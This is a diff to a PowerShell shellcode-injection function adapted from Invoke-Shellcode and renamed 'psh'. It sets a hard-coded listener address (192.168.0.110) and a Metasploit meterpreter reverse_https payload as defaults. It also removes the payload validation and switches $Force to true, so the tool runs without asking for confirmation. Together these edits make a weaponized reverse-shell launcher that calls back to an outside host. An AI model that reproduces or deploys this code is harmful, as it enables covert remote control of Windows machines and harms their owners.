@@ -1,6 +1,9 @@
 function psh
 {
 [CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
+    
+    $Lhost = '192.168.0.110',
+    
     [ValidateNotNullOrEmpty()]
     [UInt16]
     $ProcessID,
@@ -9,23 +12,13 @@ function psh
     [ValidateNotNullOrEmpty()]
     [Byte[]]
     $Shellcode,
-    
-    [Parameter( ParameterSetName = 'Metasploit' )]
-    [ValidateSet( 'windows/meterpreter/reverse_http',
-                  'windows/meterpreter/reverse_https',
-                  IgnoreCase = $True )]
-    [String]
+
     $Payload = 'windows/meterpreter/reverse_https',
     
     [Parameter( ParameterSetName = 'ListPayloads' )]
     [Switch]
     $ListMetasploitPayloads,
     
-    [Parameter( Mandatory = $True,
-                ParameterSetName = 'Metasploit' )]
-    [ValidateNotNullOrEmpty()]
-    [String]
-    $Lhost = '127.0.0.1',
     
     [Parameter( Mandatory = $True,
                 ParameterSetName = 'Metasploit' )]
@@ -49,7 +42,7 @@ function psh
     $Proxy = $False,
     
     [Switch]
-    $Force = $False
+    $Force = $True
 )
 
     Set-StrictMode -Version 2.0
@@ -57,7 +50,7 @@ function psh
     # List all available Metasploit payloads and exit the function
     if ($PsCmdlet.ParameterSetName -eq 'ListPayloads')
     {
-        $AvailablePayloads = (Get-Command Invoke-Shellcode).Parameters['Payload'].Attributes |
+        $AvailablePayloads = (Get-Command psh).Parameters['Payload'].Attributes |
             Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
     
         foreach ($Payload in $AvailablePayloads.ValidValues)
